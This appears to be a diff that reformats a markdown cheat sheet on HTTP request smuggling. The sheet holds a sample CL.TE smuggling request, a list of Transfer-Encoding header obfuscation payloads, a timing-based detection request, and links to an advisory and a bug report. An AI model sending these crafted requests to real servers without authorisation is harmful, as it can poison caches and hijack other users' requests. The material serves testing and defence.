@@ -19,61 +19,68 @@ support Transfer-Encoding but one can be induced to ignore
 the header by obfuscating the header value. 
 
 # Sample Request
-> POST / HTTP/1.1
-> Host: example.com
-> Content-Length: 6
-> Transfer-Encoding: chunked
+```
+POST / HTTP/1.1
+Host: example.com
+Content-Length: 6
+Transfer-Encoding: chunked
 
-> 0\r\n
-> G\r\n
-> \r\n
-> POST / HTTP/1.1
-> Host: example.com
+0\r\n
+G\r\n
+\r\n
+POST / HTTP/1.1
+Host: example.com
 
 
-> 0 (1 byte)
-> \r\n (carriage return + line feed, 2 bytes)
-> G (1 byte)
-> \r\n (carriage return + line feed, 2 bytes)
-
+0 (1 byte)
+\r\n (carriage return + line feed, 2 bytes)
+G (1 byte)
+\r\n (carriage return + line feed, 2 bytes)
+```
 
 # Obfuscating Payloads 
-> Transfer-Encoding: xchunked
+    Transfer-Encoding: xchunked
 
-> Transfer-Encoding : chunked
+    Transfer-Encoding : chunked
 
-> Transfer-Encoding: chunked
-> Transfer-Encoding: x
+    Transfer-Encoding: chunked
+    Transfer-Encoding: x
 
-> Transfer-Encoding:[tab]chunked
+    Transfer-Encoding:[tab]chunked
 
-> [space]Transfer-Encoding: chunked
+    [space]Transfer-Encoding: chunked
 
-> X: X[\n]Transfer-Encoding: chunked
+    X: X[\n]Transfer-Encoding: chunked
 
-> Transfer-Encoding
-> : chunked
+    Transfer-Encoding
+    : chunked
 
 
-Detecting HTTP Request Smuggling
-I'll refer to this orientation as CL.TE for short. We can detect potential request smuggling by sending the following request:
-POST /about HTTP/1.1
-Host: example.com
-Transfer-Encoding: chunked
-Content-Length: 4
+# Detecting HTTP Request Smuggling
+I'll refer to this orientation as CL.TE for short. 
+We can detect potential request smuggling by sending the following request:  
+    POST /about HTTP/1.1
+    Host: example.com
+    Transfer-Encoding: chunked
+    Content-Length: 4
 
-1
-Z
-Q
+    1
+    Z
+    Q
 
-Thanks to the short Content-Length, the front end will forward the blue text only, and the back end will time out while waiting for the next chunk size. This will cause an observable time delay.
+Thanks to the short Content-Length, the front end will forward the blue text only, 
+and the back end will time out while waiting for the next chunk size. 
+This will cause an observable time delay.
 
-If both servers are in sync (TE.TE or CL.CL), the request will either be rejected by the front-end or harmlessly processed by both systems. Finally, if the desync occurs the other way around (TE.CL) the front-end will reject the message without ever forwarding it to the back-end, thanks to the invalid chunk size 'Q'. This prevents the back-end socket from being poisoned.
+If both servers are in sync `TE.TE` or `CL.CL`, the request will either be rejected by the front-end or 
+harmlessly processed by both systems. Finally, if the desync occurs the other way around `TE.CL`
+the front-end will reject the message without ever forwarding it to the back-end, 
+thanks to the invalid chunk size `Q`. This prevents the back-end socket from being poisoned.
 
 
 
 # Further Research:
-https://docs.varnish-software.com/security/VSV00011/
+[Varnish]: https://docs.varnish-software.com/security/VSV00011/
 
 # Real World Exploits
-https://hackerone.com/reports/919175
+[Request Smuggling -> Web Cache Poisoning]: https://hackerone.com/reports/919175
